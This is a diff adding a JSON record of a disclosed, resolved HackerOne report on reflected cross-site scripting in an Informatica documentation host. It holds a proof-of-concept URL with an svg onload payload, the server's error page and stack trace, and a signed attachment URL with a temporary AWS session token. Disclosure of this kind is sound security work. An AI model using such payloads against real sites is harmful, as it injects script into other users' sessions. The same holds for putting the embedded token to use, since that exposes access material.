@@ -1,0 +1,123 @@
+{
+  "id": 232320,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzIzMjA=",
+  "url": "https://hackerone.com/reports/232320",
+  "title": "[doc.rt.informaticacloud.com] Reflected XSS via Stack Strace",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-05-26T22:19:51.680Z",
+  "submitted_at": "2017-05-26T22:19:51.680Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bigbear_",
+    "url": "/bigbear_",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/037/586/44f48a33383d8a096e7cc913a2c65dc2f6fcf90b_original.jpg/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 453,
+    "url": "https://hackerone.com/informatica",
+    "handle": "informatica",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Informatica",
+      "twitter_handle": "informatica",
+      "website": "https://www.informatica.com/",
+      "about": "Informatica Corporation is the world’s number one independent provider of data integration software."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-07-23T11:03:56.509Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-06-23T11:03:55.555Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello.\n\n###PoC for reflected XSS:\n\n`http://doc.rt.informaticacloud.com/infocenter/ActiveVOS/v92/nav/7_1_2_3_2_1<svg/onload=alert(document.domain)>`\n\n###Response:\n\n```\n<body><h2>HTTP ERROR 500</h2>\n<p>Problem accessing /help/nav/7_1_2_3_2_1%3Csvg/onload=alert(document.domain)%3E. Reason:\n<pre>    For input string: \"1&lt;svg/onload=alert(document.domain)&gt;\"</pre></p><h3>Caused by:</h3><pre>java.lang.NumberFormatException: For input string: \"1<svg/onload=alert(document.domain)>\"\n\tat java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)\n\tat java.lang.Integer.parseInt(Integer.java:492)\n\tat java.lang.Integer.parseInt(Integer.java:527)\n\tat org.eclipse.help.internal.webapp.servlet.NavServlet.getTopic(NavServlet.java:90)\n\tat org.eclipse.help.internal.webapp.servlet.NavServlet.doGet(NavServlet.java:56)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:707)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:820)\n\tat org.eclipse.equinox.http.registry.internal.ServletManager$ServletWrapper.service(ServletManager.java:180)\n\tat org.eclipse.equinox.http.servlet.internal.ServletRegistration.handleRequest(ServletRegistration.java:90)\n\tat org.eclipse.equinox.http.servlet.internal.ProxyServlet.processAlias(ProxyServlet.java:111)\n\tat org.eclipse.equinox.http.servlet.internal.ProxyServlet.service(ProxyServlet.java:67)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:820)\n\tat org.eclipse.equinox.http.jetty.internal.HttpServerManager$InternalHttpServiceServlet.service(HttpServerManager.java:318)\n\tat org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:502)\n\tat org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:380)\n\tat org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181)\n\tat org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:765)\n\tat org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)\n\tat org.mortbay.jetty.Server.handle(Server.java:324)\n\tat org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:535)\n\tat org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:865)\n\tat org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:540)\n\tat org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:213)\n\tat org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404)\n\tat org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:409)\n\tat org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:520)\n```\n\nIt is succeful worked in IE/MozillaFirefox.\n{F188420}\n\n###Possible Fix:\n\nDisable Stack Trace on this resource.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 188420,
+      "file_name": "2017-05-27_05-14-39.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/188/420/987e3c60e2913cff55d69a2fe49705b20dbea234/2017-05-27_05-14-39.png?response-content-disposition=attachment%3B%20filename%3D%222017-05-27_05-14-39.png%22%3B%20filename%2A%3DUTF-8%27%272017-05-27_05-14-39.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSA53OZRN%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T215912Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDN37G4PPtzyTXU07KcA8mSt5cdpHKzCa7QhmptDs1exgIgMK3E4YKRHkr63CdWzzUvZ93bnRFhY3AIKzobXU9spy8quwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHzzuvLxUY7SApsMZiqPBSCSlWj8KdhfulR2JEQZx4RIpxAxRq5rm9Y4PsdaPYWR5QpCm%2BUGsLH%2FoQ0Pzzncq2h%2Fdd0EjDn%2BXpir8LA2LF6pSYJAmFe7qTbkhKI429G6oQdxsN%2FCk5r3bg84W8HolWR2UpQKWwufPaURr%2F0qAq2QY2440lJ3w7XFHfhq9AUdatxRISmscFJcsSl8bV0g0MBZwQ6n5FP%2FwdyOx9NtSARNT9whnZ51xpBkaMG6XzoccptQ8NzguzpCJDNDH6CScnn0vfokEChcQ12sax7RS4HJ%2Fr7wOLMMtfzPu2xuTvCb8B9rI07GOakqIgXtQDkq3%2B8t2xmdVYcOekEYrAjMmMUuO9NA%2FEuS97KvcDwZa13Hcn%2BO3D1OV%2BrerARs5o6ppDeH%2FR%2BHgOLW43nBXKgKHjtlTE4el5HXMgew8OPJDRTbGRcHq5D7x2N2C23mN9qVkZ1KegdwllK%2BdFtfODXP406Jv8LFclB6qGQ6htao8j%2BqsGM%2BqfTWyJ6dPyhTLYs6zSdt1DPSdag48e1KH4CRxLCNTvZCGByILZ7x2SMZjPyV3jmI1HhaLYczENAF4zgks1qy6BDlmGDDx25C9jvc6xtE8YxKW2cMqxEDWYgrQsfSMlS1Mc4os9GrNJ4lOIkydqdPy4ozf0RXtwkLde3RP5w%2FnpVM16jZM5v5MWk4KtPABozie%2F8I0LP4tEQus5vXVuYjBWwOExmp9315tEVygmzkIxq%2BMHHItnYEiajCv74L39rFdz7nGaAcuVnMwpsc9p73ViduH87IAExFseNxIVnw0HclILO5vaFEDVGzR0%2FAsKOw415PjZ9zGX3xelNS5HMMvL6Ltc%2B4Jv1UJbvGELDCa3FA%2BuoP3J4dz89V1Ecww8XizAY6sQFhY3%2F454wweIVwd7GbPjQ%2F5ConieIRu0K1%2FSvYOdm%2Fv3ytQf83NfTwVMgnaZxg832Bhjv8erx5pzyzj2HAJ1T98k3yN2Yk0eAhRgAev%2FnVpmTQstcIQbmBFxj1Mg7BkFsJg4gw39mbqcfRvRgqaiNZACKNdbR6IO%2B8LdeawFNEpuer3X69Ni9ZJAYlMi6W6wpPDhfgjd3IzleuAhkgvwuSwjd3JTOoh5A1fFX8j%2FqC%2BA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=63227749227e3e0798629074d7faa3da2d817da489a43b237daef7945d2d1edf",
+      "file_size": 54451,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-07-23T11:03:55.605Z",
+  "allow_singular_disclosure_after": -113050516.73903804,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "zy9ard3",
+    "xsstestov",
+    "r3y",
+    "shivammusic",
+    "sagarkc",
+    "craig523"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
